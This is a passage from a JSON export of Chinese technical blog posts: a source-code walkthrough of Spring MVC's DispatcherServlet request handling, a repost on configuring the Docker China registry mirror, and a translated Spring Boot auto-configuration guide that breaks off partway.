detectAllHandlerAdapters = true;\n\n/**\n* Initialize the HandlerAdapters used by this class.\n* <p>If no HandlerAdapter beans are defined in the BeanFactory for this namespace,\n* we default to SimpleControllerHandlerAdapter.\n*/\nprivate void initHandlerAdapters(ApplicationContext context) {\nthis.handlerAdapters = null;\n\nif (this.detectAllHandlerAdapters) {\n// Find all HandlerAdapters in the ApplicationContext, including ancestor contexts.\nMap<String, HandlerAdapter> matchingBeans =\nBeanFactoryUtils.beansOfTypeIncludingAncestors(context, HandlerAdapter.class, true, false);\nif (!matchingBeans.isEmpty()) {\nthis.handlerAdapters = new ArrayList<HandlerAdapter>(matchingBeans.values());\n// We keep HandlerAdapters in sorted order.\nOrderComparator.sort(this.handlerAdapters);\n}\n}\nelse {\ntry {\nHandlerAdapter ha = context.getBean(HANDLER_ADAPTER_BEAN_NAME, HandlerAdapter.class);\nthis.handlerAdapters = Collections.singletonList(ha);\n}\ncatch (NoSuchBeanDefinitionException ex) {\n// Ignore, we'll add a default HandlerAdapter later.\n}\n}\n\n// Ensure we have at least some HandlerAdapters, by registering\n// default HandlerAdapters if no other adapters are found.\nif (this.handlerAdapters == null) {\nthis.handlerAdapters = getDefaultStrategies(context, HandlerAdapter.class);\nif (logger.isDebugEnabled()) {\nlogger.debug(\"No HandlerAdapters found in servlet '\" + getServletName() + \"': using default\");\n}\n}\n}\n```\n看完上面的代码是否有种似曾相识的感觉？对的，上面代码的逻辑和`initHandlerMappings`一样，同样的你可以设置`detectAllHandlerAdapters`来改变代码的逻辑，你也可以看看我上面给你的默认strategy属性文件，就可以知道Spring MVC给你加载了哪些默认的HandlerAdapter对象。只要你理解了我上面initHandlerMappings方法的分析，这个方法就没有什么可说的了，和它一样。\n\n## InitHandlerExceptionResolvers 方法\n\n这个方法中初始化的对象都为`HandlerExceptionResolver`的子类，对于Controller中出现的异常，会调用`processHandlerException`方法来统一处理异常。稍后我会详细介绍这些对象在处理异常时扮演的角色，大家现在有个印象就行。还有一点大家应该注意的就是，如果你自己并没有定义一个处理`HandlerExceptionResolver`的子类来处理异常，即使Spring MVC给你加载了默认的子类，它们也不会帮你处理异常的。这个方法的执行逻辑和上面的一样，这里我也就不多说了。\n\n## initViewResolvers 方法\n逻辑依然和上面的初始化方法一样，你可以实现ViewResolver\n 接口来定义自己的解析视图的方法。如果你并没有指定自己的类，那么默认的类为 `InternalResourceViewResolver`.\n\n## DispatcherServlet如何“统领指挥”？\n\n  上面的初始化方法都是为真正的“战役”做准备的。在这一小节中，我会带大家看看DispatcherServlet是如何调动“千军万马”来打仗（处理来自客户端的请求）的。正如它的名字一样，`DispatcherServlet`也是一个Servlet，它间接继承自HttpServlet ，它也重写了doService方法。当从客户端发出一个请求时，它会首先执行它的doService方法，如果大家去看看这个方法，它其实就是在requset域中发布一些属性，然后调用doDispatch方法。这个方法才是实际做事情的方法。下面，来让我们看看doDispatch方法的真面目吧。由于这个方法中涉及到的方法很多并且它本身的方法也很长，因此在这一小节中我不会整段整段的复制代码，而是抽出重要的代码片段，对于一些方法来说，我也会去除掉一些没有用的代码，比如记录日志的代码。因此我建议大家打开自己的源码结合着下文一起看。\n\n## 找到当前请求的handler\n从下面的代码中可以看到，`doDispatch`方法中调用getHandler方法找到相应请求的Handler，奇怪的是，返回的是一个`HandlerExecutionChain`对象，其实它很好理解，只不过是框架把找到的Handler（即我们处理请求的Controller）和一些个拦截器包装到这个对象中。\n```java\nHandlerExecutionChain mappedHandler = null;\n\nmappedHandler = getHandler(processedRequest, false);\n\n/**\n* Return the HandlerExecutionChain for this request.\n* <p>Tries all handler mappings in order.\n* @param request current HTTP request\n* @return the HandlerExecutionChain, or <code>null</code> if no handler could be found\n*/\nprotected HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {\nfor (HandlerMapping hm : this.handlerMappings) {\nHandlerExecutionChain handler = hm.getHandler(request);\nif (handler != null) {\nreturn handler;\n}\n}\nreturn null;\n}\n```\n上面代码中的getHandler方法实际就是遍历你上面初始化的HandlerMapping对象，然后用其找到相应的Handler，大家可以看到它的返回值实际是HandlerExecutionChain对象，如果大家继续Debug程序，它其实会把你定义的Handler和拦截器包装起来，一并返回。**还有一点**我想强调的是，每个HandlerMapping找到Controller的方式不同，如果大家自己跟踪一下断点，发现无论哪个HandlerMapping最终都会到`AbstractUrlHandlerMapping`类中的lookupHandler方法，这个类中其实还有个私有变量handlerMap，这个变量在容器启动的时候，Spring MVC已经把URL作为key，对应的Controller作为value存入到这个变量中。下面我给大家举个例子，假设现在我们定义的HandlerMapping为`DefaultAnnotationHandlerMapping`对象，下面我来介绍一下它映射URL到Controller大致的流程。\n* 当Servlet容器启动时，Spring MVC会实例化你所有定义的Bean，当然这绝对包括DefaultAnnotationHandlerMapping对象在实例化的过程中，它会调用`AbstractDetectingUrlHandlerMapping`中的`detectHandlers`方法，这个方法中会遍历你所有的Bean对象，甚至都会包括`DefaultAnnotationHandlerMapping`对象，从而找到URL以及相对应的Handler\n* 在第2步中的detectHandlers方法中有一个`determineUrlsForHandler`方法，这个方法有主要作用是为给定的bean找到相应的URL，这个方法是抽象的，因此它会分派给具体的子类做这件事情，因为我用的是DefaultAnnotationHandlerMapping对象，所以会调用它里面的`determineUrlsForHandler`方法`DefaultAnnotationHandlerMapping`中的 `determineUrlsForHandler`\n 方法首先会查看你给定的bean对象上是否有RequestMapping\n 注解，然后会调用determineUrlsForHandlerMethods\n 方法查找你这个bean中的方法上是否有RequestMapping\n注解，如果在第4步中得到了一个URL和Controller的映射，那么`AbstractDetectingUrlHandlerMapping`中的detectHandlers方法会调用`AbstractUrlHandlerMapping`中的 registerHandler方法，把这个映射会放入它的域变量handlerMap中\n\n从上面的步骤中可以看出，Spring MVC在容器启动完毕以后就已经把所有的URL和Controller的映射放入到AbstractUrlHandlerMapping中的handlerMap域变量中，当请求到来时，它用URL当作key来取得对应的Controller就行了。`BeanNameUrlHandlerMapping`和 `DefaultAnnotationHandlerMapping`是同样的道理，只不过它们的`determineUrlsForHandler`方法不同。\n\n`SimpleUrlHandlerMapping`这个类有点和它们不一样，它是基于配置把URL与Controller对应起来，而不是用`determineUrlsForHandler`方法来获取映射。剩下的步骤就一样了，用它里面的registerHandlers方法把这些映射注册到它的父类AbstractUrlHandlerMapping中。还有一些其它的HandlerMapping都是大同小异，这里我就不过多解释了。\n\n## 找到HandlerAdapter\n上面已经根据URL找到相应的Handler，接下来我们需要找到与当前Handler相匹配的HandlerAdapter来调用方法处理请求。大家可能会想，我们已经找到了相应的Handler，直接调用它里面的方法处理请求不就行了吗？这样做是肯定不行的。如果大家对Spring MVC熟悉的话，就会知道定义一个Controller可以有要多种多样的方式。比如，我们可以实现Controller\n 接口，也可以用注解的方式来定义Controller， 因此不同的定义方式会导致不同的调用方式。现在让我们来看看源码是怎么做的吧。\n```java\nHandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());\n\n/**\n* Return the HandlerAdapter for this handler object.\n* @param handler the handler object to find an adapter for\n* @throws ServletException if no HandlerAdapter can be found for the handler. This is a fatal error.\n*/\nprotected HandlerAdapter getHandlerAdapter(Object handler) throws ServletException {\nfor (HandlerAdapter ha : this.handlerAdapters) {\nif (ha.supports(handler)) {\nreturn ha;\n}\n}\n}\n```\n源码看起来很简单，调用getHandlerAdapter方法就可以得到一个HandlerAdapter， 但是实际上并没有这么简单。这个方法就是遍历集合中的HandlerAdapter， 找到支持当前Handler的一个HandlerAdapter，那么怎么才算支持呢？实际上不同的HandlerAdapter所支持的方式不一样。下面，我拿出2个（`AnnotationMethodHandlerAdapter`\n 和 `SimpleControllerHandlerAdapter`）大家最熟悉的HandlerAdapter的子类来看看到底哪里不一样？如果是SimpleControllerHandlerAdapter，这个就很简单了，它的supports方法只是去看看当前的Handler是否为Controller\n接口的实例，如果是就支持。如果是`AnnotationMethodHandlerAdapter`，这个就有点复杂了。下面是具体的源码。\n```java\nprivate final Map<Class<?>, ServletHandlerMethodResolver> methodResolverCache =\nnew ConcurrentHashMap<Class<?>, ServletHandlerMethodResolver>();\n\npublic boolean supports(Object handler) {\nreturn getMethodResolver(handler).hasHandlerMethods();\n}\n\n/**\n* Build a HandlerMethodResolver for the given handler type.\n*/\nprivate ServletHandlerMethodResolver getMethodResolver(Object handler) {\nClass handlerClass = ClassUtils.getUserClass(handler);\nServletHandlerMethodResolver resolver = this.methodResolverCache.get(handlerClass);\nif (resolver == null) {\nsynchronized (this.methodResolverCache) {\nresolver = this.methodResolverCache.get(handlerClass);\nif (resolver == null) {\nresolver = new ServletHandlerMethodResolver(handlerClass);\nthis.methodResolverCache.put(handlerClass, resolver);\n}\n}\n}\nreturn resolver;\n}\n```\n在理解上面的代码之前，让我们先看看`ServletHandlerMethodResolver`和 `HandlerMethodResolver`这2个类。ServletHandlerMethodResolver是 AnnotationMethodHandlerAdapter的内部类，它继承了HandlerMethodResolver。在实例化ServletHandlerMethodResolver的同时，它会调用HandlerMethodResolver中的init()方法，在这个init()方法中会解析所有带有RequestMapping注解的方法，并把它存入到它的域变量handlerMethods中。 每个Handler都对应着一个`ServletHandlerMethodResolver`实例，这个实例中包含着一切关于当前Handler中的方法信息。\n那么上面代码中的supports方法首先做的就是调用getMethodResolver方法，用一个Handler实例去获取其对应的一ServletHandlerMethodResolver\n实例，如果存在这个实例，直接返回，如果不存在，新建一个实例，并把它放入到Map缓存中。P.S. getMethodResolver方法的同步代码写的很漂亮，直得学习。\n总结来说，当第一次用到Handler中的方法处理请求时，它会一次性解析里面会用到的方法，存到一个ServletHandlerMethodResolver实例（当然了，这个实例不仅仅只有这些信息），然后用这个Handler类作为key，用ServletHandlerMethodResolver实例作为value存入到Map缓存中，等到下一个请求再一次用到这个Handler中的方法时，它直接从这个缓存中取得相应的信息就ok了。\n\n## 应用注册拦截器的preHandle方法\n这一步没有什么好说的，大家自己看看下面的代码就全明白了。\n```java\nint interceptorIndex = -1;\n\n// Apply preHandle methods of registered interceptors.\nHandlerInterceptor[] interceptors = mappedHandler.getInterceptors();\nif (interceptors != null) {\nfor (int i = 0; i < interceptors.length; i++) {\nHandlerInterceptor interceptor = interceptors[i];\nif (!interceptor.preHandle(processedRequest, response, mappedHandler.getHandler())) {\ntriggerAfterCompletion(mappedHandler, interceptorIndex, processedRequest, response, null);\nreturn;\n}\ninterceptorIndex = i;\n}\n}\n```\n实际上，除了我们自己的拦截器外，Spring MVC还给了一个拦截器为`AbstractUrlHandlerMapping$PathExposingHandlerInterceptor`\n## 调用处理请求的方法\n```java\nmv = ha.handle(processedRequest, response, mappedHandler.getHandler());\n```\n上面的代码用相应的HandlerAdapter来调用Handler来处理请求了并返回一个ModelAndView对象。不同的HandlerAdapter调用方式也不相同，对于上面我介绍的SimpleControllerHandlerAdapter来说，它只是把Handler强转成了一个Controller，然后调用handleRequest方法就行了。 对于AnnotationMethodHandlerAdapter来说，如果你能理解上面“找到HandlerAdapter”的过程，相信这个也难不倒你。\n\n`ModelAndView`是什么呢？它仅仅是一个容器存储Model 和 View，它们是完全不相同的东西，这所以这样做的原因就是在Controller\n 当中可以用一个返回值同时返回Model 和 View，下面我来举个例子。\n```java\n@Controller\npublic class HelloWorldController {\n@RequestMapping(\"/hello\")\npublic ModelAndView helloWorld() {\nString message = \"Hello Spring MVC\";\nreturn new ModelAndView(\"index.jsp\", \"info\", message);\n}\n}\n```\n上面是我Controller中的代码，它返回的View名称为index.jsp， 而Model为`{info=Hello Spring MVC}`\n\n## 应用注册拦截器的postHandle方法\n这一步也没有什么好说的，大家自己看看下面的代码就全明白了。\n```java\n// Apply postHandle methods of registered interceptors.\nif (interceptors != null) {\nfor (int i = interceptors.length - 1; i >= 0; i--) {\nHandlerInterceptor interceptor = interceptors[i];\ninterceptor.postHandle(processedRequest, response, mappedHandler.getHandler(), mv);\n}\n}\n```\n在postHandle方法中，我们可以操纵从Controller中返回的ModelAndView对象，你可以替换它，清空它，向里面加入属性等。\n## 渲染ModelAndView\n\n如果ModelAndView\n 对象不为空，并且没有调用clear\n 方法清空它，那么接下来它就会被渲染。\n```java\nif (mv != null && !mv.wasCleared()) {\nrender(mv, processedRequest, response);\nif (errorView) {\nWebUtils.clearErrorRequestAttributes(request);\n}\n}\nelse {\nif (logger.isDebugEnabled()) {\nlogger.debug(\"Null ModelAndView returned to DispatcherServlet with name '\" + getServletName() +\n\"': assuming HandlerAdapter completed request handling\");\n}\n}\n```\n上面的render方法会从给定的ModelAndView对象中解析出一个View对象，然后就调用了render方法，这个方法是要属于AbstractView类的。如果大家看一下这个类的子类，你会发现各种各样的View对象，实在是太多了，比如：FreeMarkerView VelocityView InternalResourceView. AbstractView\n类中的render方法的目的就是用给定的Model来预处理View对象，把静态属性和request域中的属性合并到模型当中，最后把这个合并过后的模型传递到具体子类的renderMergedOutputModel方法中，进行渲染。\n\n## 应用注册拦截器的triggerAfterCompletion方法\n到达这个阶段，整个doDispatch\n 方法已经全部完毕了。\n```java\ntriggerAfterCompletion(mappedHandler, interceptorIndex, processedRequest, response, null);\n```\n## 异常处理\n在上文中提到的initHandlerExceptionResolvers\n 方法中，我已经提到了关于统一异常的处理。原理就在下面的代码之中。\n```java\ncatch (ModelAndViewDefiningException ex) {\nlogger.debug(\"ModelAndViewDefiningException encountered\", ex);\nmv = ex.getModelAndView();\n}\ncatch (Exception ex) {\nObject handler = (mappedHandler != null ? mappedHandler.getHandler() : null);\nmv = processHandlerException(processedRequest, response, handler, ex);\nerrorView = (mv != null);\n}\n```\n上面的代码中有2个异常，一个是`ModelAndViewDefiningException`，对于这个异常来说，如果在你的Controller中抛出了这个异常并给定相应的ModelAndView， 它依然会在下面的代码中解析这个返回的ModelAndView\n对象，如果没有指定ModelAndView，那么程序会出错。对于其它的异常来说，都会被Exception所捕获，接着会用processHandlerException方法去处理调用我们自己定义的异常处理方法。\n\n## 总结\n至此，我已经把Spring MVC工作的细节以源码的形式说完了。如果Spring MVC是个黒盒，那么这篇文章已经为大家打开了盒子并看到了里面主要的一些东西。这篇文章也为大家探索Spring MVC开了个好头，它让我们的开发者更进一步地了解了Spring MVC，而不仅仅是单纯地使用它。Spring MVC还有很多细节、优秀地设计思想以及漂亮地编码风格值得我们去探索和学习。下图是我Google一张关于Spring MVC的流程图，画得很详细，供大家参考。\n![spring MVC 流程图](http://upload-images.jianshu.io/upload_images/1489067-078cff5b3aa8a763.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)图片来源：[http://www.programering.com/a/MDMyETNwATM.html](http://www.programering.com/a/MDMyETNwATM.html)",
			"tags":"源码,spring mvc",
			"id":"78146160",
			"categories":"JAVA_spring",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2017年09月03日 22:20:32",
			"articleedittype":1,
			"private":0,
			"channel":"12",
			"description":"通过 Docker 官方镜像加速，中国区用户能够快速访问最流行的 Docker 镜像。该镜像托管于中国大陆，本地用户现在将会享受到更快的下载速度和更强的稳定性，从而能够更敏捷地开发和交付 Docker 化应用。Docker 中国官方镜像加速可通过 registry.docker-cn.com 访问。该镜像库只包含流行的公有镜像。私有镜像仍需要从美国镜像库中拉取。您可以使用以下命令直接从该镜像加速地址",
			"title":"Docker 中国官方镜像加速",
			"type":"repost",
			"content":"<p>通过 Docker 官方镜像加速，中国区用户能够快速访问最流行的 Docker 镜像。该镜像托管于中国大陆，本地用户现在将会享受到更快的下载速度和更强的稳定性，从而能够更敏捷地开发和交付 Docker 化应用。</p>\n\n<p>Docker 中国官方镜像加速可通过 registry.docker-cn.com 访问。该镜像库只包含流行的公有镜像。私有镜像仍需要从美国镜像库中拉取。</p>\n\n<p>您可以使用以下命令直接从该镜像加速地址进行拉取：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs avrasm\">$ docker pull registry<span class=\"hljs-preprocessor\">.docker</span>-cn<span class=\"hljs-preprocessor\">.com</span>/myname/myrepo:mytag</code></pre>\n\n<p>例如:</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs avrasm\">$ docker pull registry<span class=\"hljs-preprocessor\">.docker</span>-cn<span class=\"hljs-preprocessor\">.com</span>/library/ubuntu:<span class=\"hljs-number\">16.04</span></code></pre>\n\n<blockquote>\n  <p>注: 除非您修改了 Docker 守护进程的 <code>--registry-mirror</code> 参数 (见下文), 否则您将需要完整地指定官方镜像的名称。例如，library/ubuntu、library/redis、library/nginx。 <br>\n  使用 –registry-mirror 配置 Docker 守护进程 <br>\n  您可以配置 Docker 守护进程默认使用 Docker 官方镜像加速。这样您可以默认通过官方镜像加速拉取镜像，而无需在每次拉取时指定 registry.docker-cn.com。</p>\n</blockquote>\n\n<p>您可以在 Docker 守护进程启动时传入 –registry-mirror 参数：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs avrasm\">$ docker --registry-mirror=https://registry<span class=\"hljs-preprocessor\">.docker</span>-cn<span class=\"hljs-preprocessor\">.com</span> daemon</code></pre>\n\n<p>为了永久性保留更改，您可以修改 /etc/docker/daemon.json 文件并添加上 registry-mirrors 键值。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-json hljs \">{\n  \"<span class=\"hljs-attribute\">registry-mirrors</span>\": <span class=\"hljs-value\">[<span class=\"hljs-string\">\"https://registry.docker-cn.com\"</span>]\n</span>}</code></pre>\n\n<p>修改保存后重启 Docker 以使配置生效。</p>\n\n<blockquote>\n  <p>注: 您也可以使用适用于 Mac 的 Docker 和适用于 Windows 的 Docker 来进行设置。</p>\n</blockquote>",
			"markdowncontent":"通过 Docker 官方镜像加速，中国区用户能够快速访问最流行的 Docker 镜像。该镜像托管于中国大陆，本地用户现在将会享受到更快的下载速度和更强的稳定性，从而能够更敏捷地开发和交付 Docker 化应用。\n\nDocker 中国官方镜像加速可通过 registry.docker-cn.com 访问。该镜像库只包含流行的公有镜像。私有镜像仍需要从美国镜像库中拉取。\n\n您可以使用以下命令直接从该镜像加速地址进行拉取：\n```\n$ docker pull registry.docker-cn.com/myname/myrepo:mytag\n```\n例如:\n```\n$ docker pull registry.docker-cn.com/library/ubuntu:16.04\n```\n> 注: 除非您修改了 Docker 守护进程的 `--registry-mirror` 参数 (见下文), 否则您将需要完整地指定官方镜像的名称。例如，library/ubuntu、library/redis、library/nginx。\n使用 --registry-mirror 配置 Docker 守护进程\n您可以配置 Docker 守护进程默认使用 Docker 官方镜像加速。这样您可以默认通过官方镜像加速拉取镜像，而无需在每次拉取时指定 registry.docker-cn.com。\n\n您可以在 Docker 守护进程启动时传入 --registry-mirror 参数：\n```\n$ docker --registry-mirror=https://registry.docker-cn.com daemon\n```\n为了永久性保留更改，您可以修改 /etc/docker/daemon.json 文件并添加上 registry-mirrors 键值。\n```json\n{\n  \"registry-mirrors\": [\"https://registry.docker-cn.com\"]\n}\n```\n修改保存后重启 Docker 以使配置生效。\n\n> 注: 您也可以使用适用于 Mac 的 Docker 和适用于 Windows 的 Docker 来进行设置。",
			"tags":"docker",
			"id":"77827124",
			"categories":"docker",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2017年07月13日 16:49:42",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"翻译一下Spring官网的文章，加深自己对Spring Boot自动装配的一些理解。\n  不管你是开发开源软件或者商业软件，当你在开发一个共享库的时候，那么可能你需要使用自动配置，自动配置可以捆绑在外部的jar包中，由Spring Boot提取。\n下面将介绍自动配置的一些知识：1.了解自动配置的bean查看(脱掉)Spring的代码(衣服),auto-configuration 就是一个实现了Con",
			"title":"理解Spring Boot中的auto-configuration",
			"type":"translated",
			"content":"<p>翻译一下<a href=\"https://docs.spring.io/spring-boot/docs/current/reference/html/boot-features-developing-auto-configuration.html\" target=\"_blank\">Spring</a>官网的文章，加深自己对Spring Boot自动装配的一些理解。</p>\n\n<blockquote>\n  <p>不管你是开发开源软件或者商业软件，当你在开发一个共享库的时候，那么可能你需要使用自动配置，自动配置可以捆绑在外部的jar包中，由Spring Boot提取。</p>\n</blockquote>\n\n<p>下面将介绍自动配置的一些知识：</p>\n\n\n\n<h2 id=\"1了解自动配置的bean\">1.了解自动配置的bean</h2>\n\n<p>查看(脱掉)Spring的代码(衣服),auto-configuration 就是一个实现了Configuration接口的类。使用<code>@Conditional</code>注解来限制何时让auto-configuration 生效，通常auto-configuration 使用<code>ConditionalOnClass</code>和<code>ConditionalOnMissingBean</code>注解，这两注解的确保只有当我们拥有相关类的时候使得<code>@Configuration</code>注解生效。</p>\n\n\n\n<h2 id=\"2auto-configuration的目录结构\">2.auto-configuration的目录结构</h2>\n\n<p>Spring Boot 会检查所有jar包下的<code>META-INF/spring.factories</code>文件，这个文件中<code>EnableAutoConfiguration</code> 的KEY下面罗列了需要自动配置的类，例如：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs avrasm\">org<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.boot</span><span class=\"hljs-preprocessor\">.autoconfigure</span><span class=\"hljs-preprocessor\">.EnableAutoConfiguration</span>=\\\n<span class=\"hljs-keyword\">com</span><span class=\"hljs-preprocessor\">.mycorp</span><span class=\"hljs-preprocessor\">.libx</span><span class=\"hljs-preprocessor\">.autoconfigure</span><span class=\"hljs-preprocessor\">.LibXAutoConfiguration</span>,\\\n<span class=\"hljs-keyword\">com</span><span class=\"hljs-preprocessor\">.mycorp</span><span class=\"hljs-preprocessor\">.libx</span><span class=\"hljs-preprocessor\">.autoconfigure</span><span class=\"hljs-preprocessor\">.LibXWebAutoConfiguration</span></code></pre>\n\n<p>当我们需要对配置类的加载顺序排序的时候，可以使用 <br>\n<code>@AutoConfigureAfter</code>或者<code>@AutoCOnfigureBefore</code>注解。 <br>\n例如，如果我们提供了一个特殊的web configuration,需要在<code>WebMvcAutoConfiguration</code>之后才对我们注解的类进行加载。 <br>\n如果想要自动排序，可以使用<code>@AutoconfigureOrder</code>注解，这个注解类似于<code>@Order</code>，但是它是专门给auto-configuration使用。</p>\n\n<blockquote>\n  <p>Auto-configuration 只有通过这种方式加载，确保 他们定义在一个特定的包空间下能够被扫描。</p>\n</blockquote>\n\n\n\n<h2 id=\"3condition注解\">3.Condition注解</h2>\n\n<p>我们在auto-configuration中看到不止一个使用了<code>@Condition</code>注解的类，比如  <code>@ConditionalOnMissingBean</code>，那么下面就介绍一下auto-configuration中常用的注解</p>\n\n\n\n<h3 id=\"class-conditions\">Class Conditions</h3>\n\n<p><code>@ConditionalOnClass</code>和<code>@ConditionalOnMissingClass</code> 注解允许拥有或缺失指定的类进行配置，另外使用了<strong><a href=\"http://asm.ow2.org/\" target=\"_blank\">ASM</a></strong>技术 来解析注解，我们可以使用value属性来引用出真实的类，即使这个类不会出现在正在运行的程序类路径中，如果希望指定类名，可以使用<code>name</code>属性</p>\n\n\n\n<h3 id=\"bean-conditions\">bean Conditions</h3>\n\n<p><code>ConditionalOnBean</code>和<code>ConditionalOnMissingBean</code>注解允许用于或确实指定的bean来进行配置，我们可以使用<code>value</code>属性配置一个特别的类型。或者用name配置特殊的名字，<code>search</code>属性允许限制搜索<code>ApplicationContext</code>中的层次结构。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-annotation\">@Configuration</span>\n <span class=\"hljs-keyword\">public</span>  <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">MyAutoConfiguration</span> {</span> <span class=\"hljs-annotation\">@Bean</span> <span class=\"hljs-annotation\">@ConditionalOnMissingBean</span> <span class=\"hljs-keyword\">public</span> MyService myService（）{...}\n}</code></pre>\n\n<p>在这个方法中，<code>myService</code>如果还没有存在Spring容器中，那么它将会在这个方法中得到创建。</p>\n\n<blockquote>\n  <p>这里特别需要注意bean的启动顺序，因为在做一个共享库的时候影响十分深远，所以，我们应当尽量使用<code>@ConditionalOnBean</code> 和<code>@ConditionalOnMissingBena</code>注解在auto-configuration的过程中。保证用户在添加了自已定义的bean后能够正常的加载系统。</p>\n  \n  <p><code>@ConditionalOnBean</code>和<code>@ConditionalOnMissingBean</code>不会阻止被<code>@Configuration</code>注解的类加载，所以这些条件应当去标记具体包含的每个方法</p>\n</blockquote>\n\n\n\n<h3 id=\"property-condition\">Property Condition</h3>\n\n<p><code>@ConditionalOnProperty</code>注解允许基于Spring的环境属性进行配置，使用<code>prefix</code>和<code>name</code>参数来检查指定的属性值，任何存在且不等于属性<code>false</code>都将被匹配，更高级的检查可以使用<code>havingValue</code>和<code>matchIfMissing</code>属性。</p>\n\n\n\n<h3 id=\"resource-condition\">Resource Condition</h3>\n\n<p><code>@ConditionalOnResource</code>注解去判断指定的资源是否存在，可以使用常规的Spring约束来指定资源，例如<code>file://home/usr/test.dat</code>。</p>\n\n\n\n<h3 id=\"web-application-condition\">Web Application Condition</h3>\n\n<p><code>@ConditionalOnWebApplication</code>和<code>@ConditionalOnNotWebApplication</code>注解允许根据应用是否是一个“web应用程序”被包括配置。</p>\n\n\n\n<h3 id=\"spel表达式\">SPEL表达式</h3>\n\n<p>该<code>@ConditionalOnExpression</code>注释允许基于一个的结果被包括配置<a href=\"http://docs.spring.io/spring/docs/4.3.9.RELEASE/spring-framework-reference/htmlsingle/#expressions\" target=\"_blank\">使用SpEL表达</a>。</p>\n\n\n\n<h2 id=\"创建自定义的starter\">创建自定义的starter</h2>\n\n<p>一个完整的Spring Boot starter应该包含下面这些组件： <br>\n* <code>autoconfigure</code> 模块包含了自动配置的代码 <br>\n* <code>starter</code>模块提供了一个autoconfigure的模块和其他额外的依赖。</p>\n\n\n\n<h3 id=\"命名的问题\">命名的问题</h3>\n\n<p>需要确保为我们的starter提供了一个合适名字，不要让模块名字叫<code>spring-boot</code>等一系列不知所云的名称，即使你用的不同的Maven GroupId，我们应当让模块名称更规范，容易理解。</p>\n\n<p>例如我们正在创建一个<code>acme</code>的start模块，命名推荐叫做<code>acme-spring-boot-autoconfigure</code>和<code>acme-spring-boot-starter</code>，</p>\n\n\n\n<h2 id=\"final\">final</h2>\n\n<p>starter其实是一个空的模块，它的唯一目的其实就是提供一个必要的依赖关系，</p>",
			"markdowncontent":"翻译一下[Spring](https://docs.spring.io/spring-boot/docs/current/reference/html/boot-features-developing-auto-configuration.html)官网的文章，加深自己对Spring Boot自动装配的一些理解。\n\n> 不管你是开发开源软件或者商业软件，当你在开发一个共享库的时候，那么可能你需要使用自动配置，自动配置可以捆绑在外部的jar包中，由Spring Boot提取。\n\n下面将介绍自动配置的一些知识：\n\n## 1.了解自动配置的bean\n\n查看(脱掉)Spring的代码(衣服),auto-configuration 就是一个实现了Configuration接口的类。使用`@Conditional`注解来限制何时让auto-configuration 生效，通常auto-configuration 使用`ConditionalOnClass`和`ConditionalOnMissingBean`注解，这两注解的确保只有当我们拥有相关类的时候使得`@Configuration`注解生效。\n\n## 2.auto-configuration的目录结构\n\nSpring Boot 会检查所有jar包下的`META-INF/spring.factories`文件，这个文件中`EnableAutoConfiguration` 的KEY下面罗列了需要自动配置的类，例如：\n```\norg.springframework.boot.autoconfigure.EnableAutoConfiguration=\\\ncom.mycorp.libx.autoconfigure.LibXAutoConfiguration,\\\ncom.mycorp.libx.autoconfigure.LibXWebAutoConfiguration\n```\n当我们需要对配置类的加载顺序排序的时候，可以使用\n`@AutoConfigureAfter`或者`@AutoCOnfigureBefore`注解。\n例如，如果我们提供了一个特殊的web configuration,需要在`WebMvcAutoConfiguration`之后才对我们注解的类进行加载。\n如果想要自动排序，可以使用`@AutoconfigureOrder`注解，这个注解类似于`@Order`，但是它是专门给auto-configuration使用。\n\n> Auto-configuration 只有通过这种方式加载，确保 他们定义在一个特定的包空间下能够被扫描。\n\n## 3.Condition注解\n\n我们在auto-configuration中看到不止一个使用了`@Condition`注解的类，比如  `@ConditionalOnMissingBean`，那么下面就介绍一下auto-configuration中常用的注解\n\n### Class Conditions\n\n`@ConditionalOnClass`和`@ConditionalOnMissingClass` 注解允许拥有或缺失指定的类进行配置，另外使用了**[ASM](http://asm.ow2.org/)**技术 来解析注解，我们可以使用value属性来引用出真实的类，即使这个类不会出现在正在运行的程序类路径中，如果希望指定类名，可以使用`name`属性\n\n### bean Conditions\n\n`ConditionalOnBean`和`ConditionalOnMissingBean`注解允许用于或确实指定的bean来进行配置，我们可以使用`value`属性配置一个特别的类型。或者用name配置特殊的名字，`search`属性允许限制搜索`ApplicationContext`中的层次结构。\n```java\n@Configuration\n public  class MyAutoConfiguration { @Bean @ConditionalOnMissingBean public MyService myService（）{...}\n}\n```\n在这个方法中，`myService`如果还没有存在Spring容器中，那么它将会在这个方法中得到创建。\n\n> 这里特别需要注意bean的启动顺序，因为在做一个共享库的时候影响十分深远，所以，我们应当尽量使用`@ConditionalOnBean` 和`@ConditionalOnMissingBena`注解在auto-configuration的过程中。保证用户在添加了自已定义的bean后能够正常的加载系统。\n\n\n>`@ConditionalOnBean`和`@ConditionalOnMissingBean`不会阻止被`@Configuration`注解的类加载，所以这些条件应当去标记具体包含的每个方法\n\n### Property Condition\n\n`@ConditionalOnProperty`注解允许基于Spring的环境属性进行配置，使用`prefix`和`name`参数来检查指定的属性值，任何存在且不等于属性`false`都将被匹配，更高级的检查可以使用`havingValue`和`matchIfMissing`属性。\n\n### Resource Condition\n`@ConditionalOnResource`注解去判断指定的资源是否存在，可以使用常规的Spring约束来指定资源，例如`file://home/usr/test.dat`。\n\n### Web Application Condition\n`@ConditionalOnWebApplication`和`@ConditionalOnNotWebApplication`注解允许根据应用是否是一个“web应用程序”被包括配置。\n\n### SPEL表达式\n\n该`@ConditionalOnExpression`注释允许基于一个的结果被包括配置[使用SpEL表达](http://docs.spring.io/spring/docs/4.3.9.RELEASE/spring-framework-reference/htmlsingle/#expressions)。\n\n## 创建自定义的starter\n\n一个完整的Spring Boot 